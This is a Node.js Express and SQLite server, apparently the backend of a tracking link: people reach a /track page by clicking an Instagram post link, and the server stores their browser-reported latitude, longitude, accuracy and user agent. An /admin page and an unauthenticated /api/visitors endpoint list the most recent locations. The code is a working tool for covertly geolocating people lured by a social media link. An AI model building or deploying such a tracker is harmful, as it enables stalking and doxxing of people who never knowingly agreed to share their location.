/**
 * Server backend for location tracking link application
 * Using Node.js with Express and Better-SQLite3 (cloud friendly)
 */

const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const Database = require('better-sqlite3');
const app = express();
const port = process.env.PORT || 3000;

// Setup SQLite database (better-sqlite3)
const db = new Database('./locations.db');

// Create table if not exists
db.prepare(`
  CREATE TABLE IF NOT EXISTS visitors (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    latitude REAL,
    longitude REAL,
    accuracy REAL,
    timestamp TEXT,
    userAgent TEXT
  )
`).run();

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Routes

// Serve tracking page - user clicks Instagram post link to get here
app.get('/track', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API endpoint to receive location data
app.post('/api/location', (req, res) => {
  const { latitude, longitude, accuracy } = req.body;
  const timestamp = new Date().toISOString();
  const userAgent = req.headers['user-agent'] || 'unknown';

  if (
    typeof latitude !== 'number' ||
    typeof longitude !== 'number' ||
    typeof accuracy !== 'number'
  ) {
    return res.status(400).json({ message: 'Invalid location data' });
  }

  try {
    const stmt = db.prepare(`
      INSERT INTO visitors (latitude, longitude, accuracy, timestamp, userAgent)
      VALUES (?, ?, ?, ?, ?)
    `);
    const info = stmt.run(latitude, longitude, accuracy, timestamp, userAgent);
    res.json({ message: 'Location saved', id: info.lastInsertRowid });
  } catch (err) {
    console.error('DB insert error:', err);
    res.status(500).json({ message: 'Failed to save location' });
  }
});

// Admin page to list all recorded locations
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// API to get all visitor locations (for admin page)
app.get('/api/visitors', (req, res) => {
  try {
    const rows = db.prepare(`
      SELECT * FROM visitors ORDER BY timestamp DESC LIMIT 100
    `).all();
    res.json(rows);
  } catch (err) {
    console.error('DB select error:', err);
    res.status(500).json({ message: 'Failed to retrieve data' });
  }
});

// Start server
app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});